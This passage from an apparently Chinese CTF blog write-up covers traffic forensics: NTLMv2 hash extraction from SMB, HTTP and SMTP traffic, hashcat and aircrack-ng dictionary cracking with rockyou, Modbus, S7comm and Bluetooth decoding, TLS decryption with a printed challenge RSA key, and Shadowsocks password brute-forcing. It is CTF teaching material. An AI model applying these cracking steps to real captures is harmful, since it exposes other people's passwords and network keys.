NTLMv2 Response是从ntlmProofStr开始，因此从NTLMv2的响应中要删除ntlmProofStr。

最后，在过滤器中输入ntlmssp.ntlmserverchallenge，查找NTLM Server Challenge字段，通常这个数据包是在NTLM_Auth数据包之前，将该值作为十六进制字符串复制到文本文档。

把上面三部分的参数按以下格式保存到hash.txt

```
username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response
```

```
administrator::WIN2008:9a88373dbb4f5e36:4eb74543b9962bb2ca36e938909bb930:0101000000000000d23c83f972f7d9015e866dc6343b804400000000020008004800410043004b000100040044004300040010006800610063006b002e0063006f006d0003001600440043002e006800610063006b002e0063006f006d00050010006800610063006b002e0063006f006d0007000800d23c83f972f7d9010600040002000000080030003000000000000000000000000030000046fc5f0d124bc9b99b5b560c14cd7c7e217f08f22ef5f223679ec2c576230fa30a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00310036002e0031003000000000000000000000000000
```

最后使用 hashcat 进行爆破

```
hashcat -m 5600 hash.txt rockyou.txt
```

```bash
$ hashcat -m 5600 hash.txt rockyou.txt --show
ADMINISTRATOR::WIN2008:9a88373dbb4f5e36:4eb74543b9962bb2ca36e938909bb930:0101000000000000d23c83f972f7d9015e866dc6343b804400000000020008004800410043004b000100040044004300040010006800610063006b002e0063006f006d0003001600440043002e006800610063006b002e0063006f006d00050010006800610063006b002e0063006f006d0007000800d23c83f972f7d9010600040002000000080030003000000000000000000000000030000046fc5f0d124bc9b99b5b560c14cd7c7e217f08f22ef5f223679ec2c576230fa30a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00310036002e0031003000000000000000000000000000:qwe123!@#
```

### 提取 NTLMv2 哈希值并破解（HTTP协议）

大致步骤和SMB协议的差不多，就是NTLM信息放在了 hypertext transport protocol 中
按照之前的步骤提取出来，然后 hashcat 爆破即可

```
username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response
```

```
jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000
```

### 提取 NTLMv2 哈希值并破解（SMTP协议）

这里的NTLM流量信息可能base64编码过了，所以分析前需要base64解码：

![](imgs/N6.png)

后续步骤就和之前一样了，提取信息然后用 hashcat 爆破

## 工控流量分析

参考连接：https://blog.csdn.net/song123sh/article/details/128387982

将流量按长度降序排列，然后在各层寻找线索，

显示分组字节，从base64后开始，然后解码看文件类型，最后显示成该类型
### Modbus 协议分析

Modbus 流量主要有三类：Modbus/RTU、Modbus/ASCII、Modbus/TCP

**Modbus/RTU**
&gt;从机地址1B&#43;功能码1B&#43;数据字段xB&#43;CRC值2B
&gt;最大长度256B，所以数据字段最大长度252B

**Modbus/ASCII**
&gt;由Modbus/RTU衍生，采用0123456789ABCDEF 表示原本的从机地址、功能码、数据字段，并添加开始结束标记，所以长度翻倍
开始标记:（0x3A）1B&#43;从机地址2B&#43;功能码2B&#43;数据字段xB&#43;LRC值2B&#43;结束标记\r\n2B
最大长度513B，因为数据字段在RTU中是最大252B，所以在ASCII中最大504B

**Modbus/TCP**
&gt;不再需要从机地址，改用UnitID；不再需要CRC/LRC，因为TCP自带校验
传输标识符2B&#43;协议标识符2B&#43;长度2B&#43;从机ID 1B&#43;功能码1B&#43;数据字段xB

一般题目考察 Modbus/TCP 比较多，然后主要考察的就是下面这种功能码（这里只列了部分）
因此解题的时候配合过滤器一个个功能码看过去就行
&gt;1：读线圈
2：读离散输入
3：读保持
4：读输入
5：写单个线圈
6：写单个保持
15：写多个线圈
16：写多个保持

#### 例题1 HNGK-Modbus流量分析
使用下面这个过滤器命令即可得到 flag
```
(((_ws.col.protocol == &#34;Modbus/TCP&#34;) ) &amp;&amp; (modbus.byte_cnt)) &amp;&amp; (modbus.func_code == 16)
```
![](imgs/image-20240430142133329.png)
flag{TheModbusProtocolIsFunny!}
### S7comm 协议分析
&gt; 西门子设备的工控协议，基于 COTP 实现，是COTP的上层协议
&gt; 主要有三种类型：Job(1)、Ack_Data(3)/Ack(2)、Userdata(7)
&gt; Job：下发任务/指令
&gt; Ack_Data：带有返回数据
&gt; Ack：单纯确认，含有数据
&gt; Userdata：用户自定义数据区，也包含功能指令

#### 例题1 2020ICSC湖州站—工控协议数据分析

首先过滤出S7协议的数据包，发现在一些Ack_Data的数据包中传输了二进制数据
![](imgs/image-20240430111822297.png)
因此，我们将所有带有二进制数据的数据包都过滤出来，发现一些Job的数据包中也有二进制数据
![](imgs/image-20240430112312109.png)
然后我们尝试将所有带有二进制数据的Job数据包都过滤出来并导出特定分组，过滤器代码如下
```bash
((s7comm) &amp;&amp; (s7comm.resp.data)) &amp;&amp; (s7comm.param.func == 0x05)
```

![](imgs/image-20240430112740044.png)

然后使用 tshark 提取数据
```tshark
tshark -r 1.pcap -T fields -e s7comm.resp.data | uniq
```
![](imgs/image-20240430112936680.png)

最后 CyberChef 解码二进制即可得到 flag
![](imgs/image-20240430113016466.png)
#### 例题2 2020ICSC济南站—被篡改的数据
翻看流量包，发现很多 S7COMM 数据包，使用过滤器过滤，发现 s7comm.resp.data 字段传了很多 66 数据
使用过滤器过滤出传了 s7comm.resp.data 字段数据但数据不是 66 的 S7 数据包
发现了疑似 flag 的数据，为了防止 flag 中含有 f 字符而被过滤
因此我们使用下面这个过滤命令进行过滤，然后导出特定分组
```
(((frame.number &gt;= 19987 &amp;&amp; frame.number &lt;=20032) &amp;&amp; (_ws.col.protocol == &#34;S7COMM&#34;)) &amp;&amp; (s7comm.param.func == 0x05)) &amp;&amp; (s7comm.resp.data)
```
最后 tshark 提取出数据，然后十六进制解码即可得到 flag：flag{93137ad4a}

#### 例题3 枢网智盾2021—异常流分析
打开流量包，发现很多 S7comm 流量，然后稍微过滤一下，发现是写入数据的流量
然后写入的数据几乎都是 ffff 开头的，因此我们直接查看不是 ffff 开头的数据
```
((_ws.col.protocol == &#34;S7COMM&#34;) &amp;&amp; (s7comm.param.func == 0x05)) &amp;&amp; (s7comm.resp.data[0:2] != ff:ff)
```
即可得到 flag：flag{ffad28a0ce69db34751f}
#### 例题4 枢网智盾2021—工控协议分析
```
(_ws.col.protocol == &#34;S7COMM&#34;) &amp;&amp; (frame.number == 418)
```
![](imgs/image-20240430135813366.png)
然后直接把明文传输的数据 base64 解码即可
![](imgs/image-20240430135958048.png)
flag{hncome66!}
## 蓝牙流量分析
### OBEX协议

过滤器中输入`OBEX`，然后导出传输的压缩包，然后再在搜索中输入`PIN Code`选择分组列表和字符串即可找到解压密码

### ATT协议

例题1-low_energy_crypto

```bash
# 先用tshark导出公钥，并把公钥另存为pub.key
tshark -r low_energy_crypto.pcapng -T fields -e btgatt.nordic.uart_rx -Y &#39;btatt.opcode == 0x1b&#39; | sed &#39;/^\s*$/d&#39; | uniq &gt; data.txt
# 然后用tshark导出密文，这里的数据如果不是十六进制，用tshark提有时候会出问题，可以手提
tshark -r low_energy_crypto.pcapng -T fields -e btgatt.nordic.uart_tx -Y &#39;btatt.opcode == 0x12&#39; | sed &#39;/^\s*$/d&#39; | uniq &gt; enc.txt
# 公钥和密文都有了之后，就可以直接用RsaCtfTool解密密文了，这里的密文后面如果有多余\x00，可以用010手动去除，要不然可能解密失败
python3 /home/kali/RsaCtfTool/RsaCtfTool.py --publickey ./pub.key --decryptfile ./enc.txt
```

![](imgs/image-20241202135717254.png)

例题2-BLE_crypto
```bash
# 先用tshark导出公钥，并把公钥另存为pub.key，这里如果是十六进制，需要CyberChef转换一下先
tshark -r BLE_crypto.pcapng -T fields -e btatt.value -Y &#39;btatt.opcode&#39; | sed &#39;/^\s*$/d&#39;
# 然后用tshark导出密文，如果是十六进制，需要CyberChef转换一下先
tshark -r low_energy_crypto.pcapng -T fields -e btgatt.nordic.uart_tx -Y &#39;btatt.opcode == 0x12&#39; | sed &#39;/^\s*$/d&#39; | uniq &gt; enc.txt
# 公钥和密文都有了之后，就可以直接用RsaCtfTool解密密文了
python3 /home/kali/RsaCtfTool/RsaCtfTool.py --publickey ./pub.key --decryptfile ./enc
```

![](imgs/image-20241202140503314.png)


### SMP协议

SMP协议的全称是Secure Manager Protocol，用来定义蓝牙的配对和密钥的分发

配对完成后传输的数据是加密的，我们需要用(Crakle)[https://github.com/mikeryan/crackle]这个项目进行解密

&gt; 这里老版本的可能有点问题，建议去pr中找一下新版的安装
&gt; 
&gt; 参考链接：https://cloud.tencent.com/developer/article/2159878

安装好项目后直接运行一下命令解密流量包即可

```bash
crackle -i uploads_2022_04_11_h5kAcZEg_ble.pcapng -o dec.pcapng
```

![](imgs/image-20241202141020218.png)

SMP协议解密完成后，我们可以在ATT协议中发现传输的数据，用以下命令导出

```bash
tshark -r dec.pcapng -T fields -e btatt.value -Y &#39;btatt.opcode == 0x52&#39; | sed &#39;/^\s*$/d&#39;
```

然后CyberChef将得到的十六进制数据转换一下即可得到flag：`flag{9ba3973652c0ee073652c0ee0c76ca6cb36441bd40}`

## 邮件(STMP)流量分析

可以试试看导出对象-导出IMF-导出文件的后缀是eml（可以使用网易邮箱大师打开）

eml文件是将数据base64编码后再传输的，有些数据直接用邮箱软件打开可能看不到，建议手搓一遍

## 无线流量分析

在kali中用弱口令密码爆破出WIFI密码
执行命令：aircrack-ng ctf.pcap -w rockyou.txt
执行命令解码：airdecap-ng -p password1 ctf.pcap -e ctf -o 1.pcap
然后打开解码后的文件，查找flag

## DNS流量分析

![](imgs/image-20241120165643159.png)

直接使用tshark导出DNS外带的数据
```bash
tshark -r 1.pcap -T fields -e dns.qry.name -Y &#39; ip.dst == 8.8.8.8 &amp;&amp; dns.qry.type == 1&#39; | sed &#39;/^\s*$/d&#39; | uniq &gt; data.txt
```

例题1-攻防世界 MISC - tunnel

## SLL、TLS加密流量分析

老版本的 wireshark 中显示的是 SSL，新版本的改成TLS了

解密方法就是点击 编辑 -&gt; 首选项 -&gt; Protocols -&gt; TLS 加载 RSA 私钥 或 者加载日志文件
解完密后就和平常的流量分析一样了

例题-BUU 第九章TLS流量分析

打开流量包发现有 TLS 数据包，然后还有一些红黑条纹，猜测是被加密了

翻看流量包，追踪 TCP 流，发现流7中POST了一个 sslkey.log 日志文件

![](imgs/N7.png)

导出 sslkey.log 日志文件，然后按上面的步骤导入解密

![](imgs/N8.png)

解密完后直接搜索 flag{ 字符串即可找到 flag{e3364403651e775bfb9b3ffa06b69994}

![](imgs/N9.png)

例题-DDCTF2018 流量分析

直接在 TLS 加载 RSA 私钥解密即可

私钥的格式如下：

```
-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O&#43;mIQiOUQCvN0HYbj8153JfSQ
LsJIhbRYS7&#43;zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO
vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB
AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4
QGfzYqOn8&#43;Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/
QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN
czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd&#43;F13GBCOQ
ZCM4prBjAkEAz&#43;ENahsEjBE4&#43;7H1HdIaw0&#43;goe/45d6A2ewO/lYH6dDZTAzTW9z9
kzV8uz&#43;Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ&#43;tYBzN
&#43;04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1
AnbJ4Z6opJCGu&#43;UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ&#43;HLJ1/wH
/5pfc3AmEyRdfyx6zwUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH
2STT5qZWzQFz8NRe&#43;/otNOHBR2Xk4e8IS&#43;ehIJ3TvyE=
-----END RSA PRIVATE KEY-----
```

例题-2024铁三初赛 流量分析

## ICMP流量分析

flag 可能藏在每一帧的长度中

```
tshark -r 1.pcapng -Y &#34;icmp&#34; -T fields -e frame.len | uniq &gt; data.txt
```

```python
with open(&#39;data.txt&#39;, &#39;r&#39;) as f:
    data = f.read().split()
flag = &#39;&#39;
for item in data:
    flag &#43;= chr(int(item)-42)
print(flag)
```

例题-第三届“百越杯”福建省高校网络空间安全大赛 要想会，先学会

## VPN流量分析

### Shadowsocks流量分析

例题-2023强网杯-谍影重重3.0

```python
#请求解密脚本
import hashlib
from Crypto.Cipher import AES


def EVP_BytesToKey(password, key_len, iv_len):
    m = []
    i = 0
    while len(b&#39;&#39;.join(m)) &lt; (key_len &#43; iv_len):
        md5 = hashlib.md5()
        data = password
        if i &gt; 0:
            data = m[i - 1] &#43; password
        md5.update(data)
        m.append(md5.digest())
        i &#43;= 1
    ms = b&#39;&#39;.join(m)
    key = ms[:key_len]
    iv = ms[key_len:key_len &#43; iv_len]
    return key, iv


def decrypt(cipher, password):
    key_len = int(256/8)
    iv_len = 16
    mode = AES.MODE_CFB
    key, _ = EVP_BytesToKey(password, key_len, iv_len)
    cipher = bytes.fromhex(cipher)
    iv = cipher[:iv_len]
    real_cipher = cipher[iv_len:]
    obj = AES.new(key, mode, iv, segment_size=128)
    plain = obj.decrypt(real_cipher)
    return plain


def main():
cipher = &#39;e0a77dfafb6948728ef45033116b34fc855e7ac8570caed829ca9b4c32c2f6f79184e333445c6027e18a6b53253dca03c6c464b8289cb7a16aa1766e6a0325ee842f9a766b81039fe50c5da12dfaa89eacce17b11ba9748899b49b071851040245fa5ea1312180def3d7c0f5af6973433544a8a342e8fcd2b1759086ead124e39a8b3e2f6dc5d56ad7e8548569eae98ec363f87930d4af80e984d0103036a91be4ad76f0cfb00206&#39;
    # 因为password未知，所以我们这里尝试用字典进行爆破
    with open(&#39;rockyou.txt&#39;, &#39;rb&#39;) as f:
        lines = f.readlines()
    for password in lines:
        plain = decrypt(cipher, password.strip())
        if b&#39;HTTP&#39; in plain:
            print(password.decode(), plain.decode())
            break


if __name__ == &#34;__main__&#34;:
    main()
```

### VMess(V2ray)流量分析

#### VMessMD5

【例题：2022强网杯-谍影重重】

#### VMessAEAD

【例题：2024 DubheCTF-authenticated mess &amp; unauthenticated less】

## ADS-B流量分析

飞机/航空器流量，找到流量数据，用pyModeS模块分析即可

例题

**[2023 强网杯] 谍影重重2.0**

下载附件得到一个只有TCP流量的流量包
题目需要我们分析流量包找到飞机的飞机速度和飞机的 ICAO CODE
问了GPT得知飞机常见的协议中有ADS-B，然后在网上找到pyModeS这个模块
在参考链接：https://gitee.com/wangmin-gf/ads-b 看到了与tcp.payload中相似的数据
使用tshark提取出流量包中的数据，然后使用这个脚本批量解密找speed最快的即可

tshark -r attach.pcapng -T fields -e &#34;tcp.payload&#34; | sed &#39;/^\s*$/d&#39; &gt; tshark.txt

```python
import pyModeS
with open(&#34;tshark.txt&#34;) as f:
    data = f.readlines()
    for item in data:
        # print(item.strip())
        if len(item.strip()) != 46:
            continue
        res = pyModeS.tell(item.strip()[18:46])
        print(&#34;===========================================================================&#34;)
```

```bash
===========================================================================
                     Message: 8d79a05e990ccda6f80886dd9544
                ICAO address: 79a05e
             Downlink Format: 17
                    Protocol: Mode-S Extended Squitter (ADS-B)
                        Type: Airborne velocity
                       Speed: 371 knots
                       Track: 213.3474959459136 degrees
               Vertical rate: -64 feet/minute
                        Type: Ground speed
===========================================================================
```

## 损坏的流量包分析

例题-第一届“百度杯”信息安全攻防总决赛 find the flag（flag藏在 frame29-41 的 ip.id 字段中）

打开流量包后发现有如下的报错

![](imgs/N10.png)

可以直接使用 [在线网站](https://f00l.de/hacking/pcapfix.php) 修复

修复完成以后就是正常的流量分析了

## 从流量包中找异常流量
一般这种题目的做法就是，观察正常的流量包中的字段，毕竟一个流量包中正常的流量肯定占大多数，
然后结合过滤器，一个字段一个字段地进行排除，就是筛选出不等于正常字段值的流量。

---

> Author: [Lunatic](https://goodlunatic.github.io)  
> URL: https://goodlunatic.github.io/posts/5422d65/  

